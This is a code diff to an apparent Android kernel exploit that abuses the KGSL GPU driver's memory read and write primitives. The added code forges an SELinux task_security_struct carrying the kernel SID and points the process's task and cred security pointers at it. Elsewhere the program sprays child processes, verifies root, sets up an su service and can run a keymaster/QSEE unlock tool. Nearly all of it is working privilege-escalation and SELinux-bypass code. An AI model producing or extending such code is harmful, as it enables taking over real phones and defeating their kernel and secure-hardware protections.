@@ -526,6 +526,32 @@ static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
     ctrls[idx].root_done = 1;
     __sync_synchronize();
     if (ctrls[idx].error) _exit(1);
+    if (getenv("SEC_SID")) {
+        /* The parent pointed task->security and cred->security at a forged
+         * task_security_struct with osid = sid = 1 (kernel). Verify it and
+         * keep the patched task alive: selinux_task_free() would otherwise
+         * kfree() an interior pointer and take the kernel down. */
+        (void)prctl(PR_SET_PDEATHSIG, 0, 0, 0, 0);
+        int cf = open("/proc/self/attr/current", O_RDONLY);
+        if (cf >= 0) {
+            char ctx[128] = {0};
+            int n = (int)read(cf, ctx, sizeof(ctx) - 1);
+            close(cf);
+            int of = open("/data/local/tmp/sec_ctx.txt",
+                          O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (of >= 0) {
+                if (n > 0) (void)!write(of, ctx, (size_t)n);
+                close(of);
+            }
+        }
+        if (getenv("KM_UNLOCK_MODE")) {
+            ctrls[idx].qsee_status = run_kmunlock_tool();
+            __sync_synchronize();
+            ctrls[idx].qsee_done = 1;
+            futex_wake_int(&ctrls[idx].qsee_done);
+        }
+        for (;;) pause();
+    }
     if (getenv("KM_UNLOCK_MODE")) {
         struct selinux_handoff_state *handoff = &ctrls[idx].handoff;
         if (!g_target->qsee_context ||
@@ -1689,11 +1715,12 @@ int main(int argc, char **argv) {
     }
     const char *km_mode = getenv("KM_UNLOCK_MODE");
     int run_kmunlock = km_mode && *km_mode;
+    int sec_sid_mode = getenv("SEC_SID") != NULL;
     if (run_kmunlock && strcmp(km_mode, "read") && strcmp(km_mode, "write")) {
         fprintf(stderr, "[-] KM_UNLOCK_MODE must be read or write\n");
         return 2;
     }
-    if (!run_kmunlock && su_runtime_wait_ready(300) == 0) {
+    if (!run_kmunlock && !sec_sid_mode && su_runtime_wait_ready(300) == 0) {
         printf("[+] root su service already running\n");
         return 0;
     }
@@ -1750,7 +1777,7 @@ int main(int argc, char **argv) {
         perror("install child cleanup handlers");
         return 1;
     }
-    if (!run_kmunlock && su_runtime_prepare() < 0) {
+    if (!run_kmunlock && !sec_sid_mode && su_runtime_prepare() < 0) {
         perror("prepare su runtime");
         return 1;
     }
@@ -1854,6 +1881,59 @@ int main(int argc, char **argv) {
         return 1;
     }
 
+    uint64_t forged_security = 0;
+    if (sec_sid_mode) {
+        if (!g_target->task_security || !g_target->task_fake_sec ||
+            !g_target->task_group_leader || !selected_cred_alias) {
+            fprintf(stderr,
+                    "[-] SEC_SID needs task_security/task_fake_sec/"
+                    "task_group_leader and a cred alias\n");
+            kill_children_except(-1);
+            return 2;
+        }
+        /* root_child.page and the cred alias live in the KGSL object address
+         * space. task->security needs a *kernel* virtual address, so take the
+         * task_struct's own kernel address from task->group_leader (the child
+         * is single threaded, so it points at itself). */
+        uint32_t gl[2] = {0, 0};
+        if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                           dump_id, dump_gpu, dump_vma,
+                           root_child.page + g_target->task_group_leader,
+                           gl, 2) < 0) {
+            perror("read task group_leader");
+            kill_children_except(-1);
+            return 1;
+        }
+        uint64_t group_leader = ((uint64_t)gl[1] << 32) | gl[0];
+        if ((group_leader & 0xffff000000000000ULL) != 0xffff000000000000ULL ||
+            (group_leader & 7ULL)) {
+            fprintf(stderr, "[-] unexpected group_leader=%016llx\n",
+                    (unsigned long long)group_leader);
+            kill_children_except(-1);
+            return 1;
+        }
+        forged_security = group_leader + g_target->task_fake_sec;
+        uint32_t ids[2] = {1, 1};              /* osid = sid = 1 (kernel) */
+        uint32_t ptr[2] = {(uint32_t)forged_security,
+                           (uint32_t)(forged_security >> 32)};
+        if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                            root_child.page + g_target->task_fake_sec,
+                            ids, 2) < 0 ||
+            gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                            root_child.page + g_target->task_security,
+                            ptr, 2) < 0 ||
+            gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                            selected_cred_alias + g_target->cred_security,
+                            ptr, 2) < 0) {
+            perror("forge task_security_struct");
+            kill_children_except(-1);
+            return 1;
+        }
+        printf("[+] forged SID 1 task_security_struct: kva=%016llx gpu=%016llx\n",
+               (unsigned long long)forged_security,
+               (unsigned long long)(root_child.page + g_target->task_fake_sec));
+    }
+
     uint64_t child_security = 0;
     if (run_kmunlock) {
         uint32_t security_words[2] = {0, 0};
@@ -1882,7 +1962,7 @@ int main(int argc, char **argv) {
 
     printf("[*] reaping spray children after root verification\n");
     kill_children_except(root_child.idx);
-    if (!run_kmunlock) su_runtime_close_prepared_server_socket();
+    if (!run_kmunlock && !sec_sid_mode) su_runtime_close_prepared_server_socket();
     ctrls[root_child.idx].handoff.current_security = child_security;
     ctrls[root_child.idx].root_done = 0;
     ctrls[root_child.idx].error = 0;
